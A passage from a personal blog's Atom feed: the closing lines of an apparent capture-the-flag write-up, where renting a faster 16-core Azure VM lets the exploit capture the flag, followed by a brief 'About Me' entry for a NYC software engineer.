&amp;lt;p&amp;gt;We decided to purchase a VPS in Azure in the Germany region. Running the script there improved the Nginx PID retrieval significantly (30 seconds to 5 seconds) but the exploit still didn’t show results. Eventually, we noticed the new VPS only had 4 cores. We spent a few more $ to buy a 16-core VM in Germany, and got the flag within 5 seconds!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The conclusion - always use money to solve your problems!&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
    
        
        
            
            <entry>
                <title>About Me</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;about&#x2F;"/>
                <updated>2025-10-19T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;about&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;&amp;lt;div class=&amp;quot;about_me&amp;quot;&amp;gt;
  &amp;lt;img src=&amp;quot;&amp;amp;#x2F;images&amp;amp;#x2F;about&amp;amp;#x2F;me.jpg&amp;quot; &amp;gt;
  
&amp;lt;&amp;#x2F;div&amp;gt;
Hi! I&amp;#x27;m Guy, a software engineer currently living in NYC.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I&amp;#x27;m passionate about Rust 🦀, Home Assistant 🏠️, eating good food 🥩 and drinking too much coffee ☕️.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
    
</feed>
